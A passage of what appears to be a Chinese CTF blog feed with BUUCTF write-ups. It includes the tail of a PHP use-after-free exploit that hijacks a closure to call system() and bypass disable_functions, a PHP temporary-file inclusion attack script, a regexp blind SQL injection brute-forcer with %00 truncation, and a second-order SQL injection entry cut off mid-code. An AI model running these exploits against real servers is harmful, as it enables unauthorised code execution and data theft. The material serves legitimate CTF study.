class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将这个脚本上传上去 这里最好是到 &#x2F;var&#x2F;tmp  或者 &#x2F;tmp 这两个路径是用户用于存储临时性的文件，亦经常被程序读写用户存储临时性数据，本质上没区别，既然是用户存储临时性数据，我们一般是有写文件权限的。 </p><p>可以在我的centos7上看看</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051771351-a93986bf-01f1-43c9-a09d-e42c37133783.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051825293-1ea88dd7-710f-4876-9de0-95c867ad2022.png" alt="img"></p><p>可以看到这两种路径的默认权限是777</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051303740-0e86adff-6bd1-4558-a103-ad3614348457.png" alt="img"></p><p>上传成功 之后再去包含他</p><p>成功~</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051469402-699b9232-eb82-451c-8e15-007bc3886685.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-91-[NPUCTF2020]ezinclude</title>
      <link href="/post/da0771e5.html"/>
      <url>/post/da0771e5.html</url>
      
        <content type="html"><![CDATA[<p>[NPUCTF2020]ezinclude</p><span id="more"></span><p>一道php文件临时包含的题目，之前没见过</p><p>进入之后 根据提示 给pass传一个hash值 可以抓包看到</p><p>然后直接在bp里操作就行，不然网页会挑战到一个404网页</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137425602-9e43ff11-ea0a-4d35-9bc4-e4b30806e036.png" alt="img"></p><p>存在文件包含</p><p>一般这种flag文件名称会被改写成奇奇怪怪的形式，靠猜是猜不到的</p><p>读一下当前页面的源码吧 用一下伪协议</p><p>构造payload：<code>?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</code></p><p>发现data input zip协议都被河蟹了 没办法直接命令执行</p><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,$file))&#123;</span><br><span class="line">die(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@include(<span class="params">$file</span>);</span></span><br><span class="line">echo <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>扫一下网站 发现还有config.php 里面是假的flag 还有一个dir.php</p><p>内容如下：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137766612-8b1fa82f-df6a-4aa0-89e5-d0945ac1bf4f.png" alt="img"></p><p>发现这个文件可以帮我们扫&#x2F;tmp的文件目录 这个目录是存储用户临时文件的地方 我们对他有写权限 </p><p>这里用到了 php临时文件包含的漏洞 具体参考（<a href="https://www.anquanke.com/post/id/201136#h2-11%EF%BC%89">https://www.anquanke.com/post/id/201136#h2-11）</a></p><p>php7.0的bug：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure><p>使用<code>php://filter/string.strip_tags</code>导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell,这个崩溃原因是存在一处空指针引用。</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃。</p><p>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复  </p><p>• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复 </p><p>• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</p><p>利用大佬现成的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">url=<span class="string">&quot;http://5fd4afee-539c-424e-9b53-31cc89bbddf7.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload=<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url=url,files=files,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>之后再去看看dir.php</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137989466-9f670370-e4b0-47fe-a73d-978c28304509.png" alt="img"></p><p>发现我们的恶意文件已经被上传</p><p>再去包含一下我们的文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681138061207-03a37f3f-f1cd-4103-9530-a59e235d7fe0.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php临时文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-90-[NCTF2019]SQLi</title>
      <link href="/post/4f5e876.html"/>
      <url>/post/4f5e876.html</url>
      
        <content type="html"><![CDATA[<p>[NCTF2019]SQLi</p><span id="more"></span><p>sql注入 fuzz一下发现屏蔽了很多的sql常用命令</p><p>扫服务器后台发现hint.txt</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030820273-63312165-e4dd-489c-8d16-4d6a50608be8.png" alt="img"></p><p>也就是当我们获得admin的密码时，就能获得flag，连admin都被黑名单了，显然是不想让我们通过常用的手段去注入</p><p>回到主页看到他已经给了我们系统的查询语句</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030986280-e33b949b-5625-4741-be44-78bb74245b06.png" alt="img"></p><p>这里是不是就能想到通过巧妙的闭合改变查询语句使得我们的恶意注入语句就能被调用</p><p>看了大佬的wp发现是正则注入 regexp</p><p>本地测试</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681031145077-b7064c79-5562-4128-994e-bb74b5ef25a1.png" alt="img"></p><p>能看出无论username的内容是否在这个表单中，因为有<code>||</code>（相当于逻辑或）</p><p>当<code>password=&quot;^1&quot;</code>也就是以1开头 之后以12开头，利用这样的正则匹配去一位一位的试探，思路类似于布尔盲注，根据回显来判断。</p><p>回到题目，应该怎么构造呢</p><p>题目sql里的查询语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>可以构造<code>username=\&amp;passwd=||sql;%00</code>  空格被河蟹了可以用<code>/**/</code>绕过  注释符<code># --</code></p><p><code>%00</code>来绕过本质上是截断 这里末尾的封号实际上是sql语句里的</p><p>因为很多程序底层都是c语言编译的，c语言对于一个字符串到末尾的标识是是否检测到<code>\0</code>经过url加密后即为<code>%00</code></p><p>放入原语句后为：<code>select * from users where username=&#39;\&#39; and passwd=&#39;||sql;%00&#39;</code></p><p>相当于username中的语句为<code>&#39; and passwd =</code>内容不重要 然后逻辑或 加上我们的sql注入的恶意语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;%00</span><br></pre></td></tr></table></figure><p>如果回显正常为会定向到welcome.php</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681033291490-4106c873-7f0f-4dc4-930a-176e216861db.png" alt="img"></p><p>根据思路写出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://16b0c2ee-be28-47f4-8454-b6a04a23aa8f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dictionary = string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#x27;</span> <span class="comment">#爆破字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dictionary:</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;\\&quot;</span>,   <span class="comment">#这里需要转义一下</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>:<span class="string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="built_in">format</span>((result+j),parse.unquote(<span class="string">&quot;%00&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;welcome&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result+=j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>这里注意一下：如果在登录框里面敲%00 那样会导致%00被转义而失去作用 在python脚本里面 我们用parse.unquote(‘%00’)表示不进行转义的%00 这样就能爆出密码  </p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> sql bypass </tag>
            
            <tag> sql正则注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-88-[网鼎杯 2018]Comment</title>
      <link href="/post/3a0e9ae9.html"/>
      <url>/post/3a0e9ae9.html</url>
      
        <content type="html"><![CDATA[<p>[网鼎杯 2018]Comment</p><span id="more"></span><p>这是一道关于sql二次注入的题目 第一次遇到二次注入的题目蛮不错</p><p>进入之后，是一个类似于留言板的界面</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456616603-81a091fd-c756-4579-9d71-8352ed648e24.png" alt="img"></p><p>需要先登录 然后形式是密码最后三位纯数字不知道 通过bp爆破一下就出来了 密码结尾是666</p><p>进入之后f12</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456702395-d52c4662-22f7-4655-af63-fa9d6fc43792.png" alt="img"></p><p>发现提示 存在git源码泄露的</p><p>直接上githack</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456816678-f2f3e1ca-7c33-420e-ba91-40677e6f3b1c.png" alt="img"></p><p>发现源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;</span><br><span class="line">    header(&quot;Location: ./login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;do&#x27;]))&#123;</span><br><span class="line">switch ($_GET[&#x27;do&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">case 